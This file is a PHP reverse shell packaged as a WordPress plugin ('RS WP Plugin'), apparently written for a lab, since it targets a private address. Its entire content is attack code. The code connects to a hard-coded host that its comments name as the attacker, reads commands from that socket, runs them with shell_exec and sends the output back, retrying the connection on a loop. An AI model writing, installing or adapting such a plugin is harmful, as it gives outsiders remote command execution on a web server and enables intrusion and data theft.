<?php
/**
 * Plugin Name:       RS WP Plugin
 * Author:            Geomancer
 */

// create an outbound connection to attacker
function open_connection($attacker_ip, $attacker_port, $timeout){
    $fp = fsockopen($attacker_ip, $attacker_port, $errno, $errstr, $timeout);
    return $fp;
}

$attacker_ip = "192.168.56.105";
$attacker_port = 9300;
$timeout = 5;

// establish connection
while(true){
    $connection = open_connection($attacker_ip, $attacker_port, $timeout);
    if(!$connection and $attempts < 3){
        $attempts = $attempts + 1;
        sleep($timeout);
    }else if ($connection and $attempts >= 3){
        $attempts = 0;
        sleep(3600 * 12);
    }else{
        break;
    }
}

// wait for bytes
stream_set_timeout($connection, 5);

$response = '';

// Loop until the server closes the connection (End of File)
while (!feof($connection)) {
    $buffer = fgets($connection, 4096);
    $response .= $buffer;
    
    // Check if the stream timed out during this read cycle
    $info = stream_get_meta_data($connection);
    if ($info['timed_out']) {
        $connection = open_connection($attacker_ip, $attacker_port, $timeout);
    }

    $output = shell_exec($response);

    // send output back
    fwrite($connection, $output);
}

fclose($connection);

?>